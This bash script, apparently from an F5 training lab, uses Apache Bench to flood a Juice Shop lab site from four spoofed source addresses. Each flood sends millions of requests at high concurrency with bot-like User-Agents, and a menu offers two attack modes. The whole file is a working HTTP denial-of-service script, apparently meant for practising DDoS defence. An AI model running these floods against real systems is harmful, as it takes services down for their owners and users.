#!/bin/bash

# Created on Jul 12, 2022 12:33:48 PM

# #!/bin/bash
# v1.0 by sVen Mueller
# v4.0 by F5 Technical Training (August 1, 2023)
## This script creates Apache Benche traffic that looks like attack traffic. It is designed to work with the Juice Shop application. It should run at the same time as a
## baseline.sh.
#
# If you want to debug, change the first line to #!/bin/bash -x
# to get the student_id number from SSH_CLIENT env variable
# if SSH_CLIENT is not set, the script will exit
#
#if [ -n "$SSH_CLIENT" ]; then
 #  student_id=$(echo $SSH_CLIENT | cut -f3 -d.)
# else
  # echo "SSH_CLIENT variable is not set, cannot continue, exiting"
   # exit 1
# fi
# trap ctrl_c INT

function ctrl_c() {
   echo "** Trapped CTRL-C"
   kill -9 $SYN1_PID
   exit 1
}
clear
echo "Attacking Juice Shop"
echo
###########################################
# $1    IP address (BIG-IP VS address)
IP=$1
# VS_ADDR=${1:-10.10.${student_id}.101}

# $2 Source Address 1 (Kali box interface)
# $3 Source Address 2 (Kali box interface)
# $4 Source Address 3 (Kali box interface)
SRC_ADDR1=10.10.112.111
SRC_ADDR2=10.10.112.112
SRC_ADDR3=10.10.112.113
SRC_ADDR4=10.10.112.114
#
###########################################

stop_flag=0

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

function ctrl_c() {
    echo "** Trapped CTRL-C"
    stop_flag=1
}

PS5='Please enter your choice: '
options=("Attack start - similarity" "Attack start - score"  "Attack end" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Attack start - similarity")
            echo "Start attack"
            stop_flag=0
            while [ "$stop_flag" -eq 0 ]
            do

                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: eVil-sVen" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/ &
                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/ &
                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/ &
                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/

                    killall ab
            done
            ;;
        "Attack start - score")
        echo "Start attack"
            stop_flag=0
            while [ "$stop_flag" -eq 0 ]
            do
                    ab -B ${SRC_ADDR1} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US" http://juice.f5trn.com/ &
                    ab -B ${SRC_ADDR2} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/second.jpg &
                    ab -B ${SRC_ADDR3} -l -r -n 1000000 -c 500 -d -s 10 -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: WireXBot" -H "x-requested-with:" -H "Referer: http://10.10.2.2/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/ &
                    ab -B ${SRC_ADDR4} -l -r -n 1000000 -c 500 -d -H "Host: avalanchecorp.net" -H "Pragma: no-cache" -H "Cache-Control: no-cache" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Darth-Vader" -H "x-requested-with:" -H "Referer: http://10.10.2.1/none.html" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US"  http://juice.f5trn.com/

                    killall ab
            done

            ;;

        "Attack end")
            echo "Terminate attack"

        killall ab
            ;;

        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
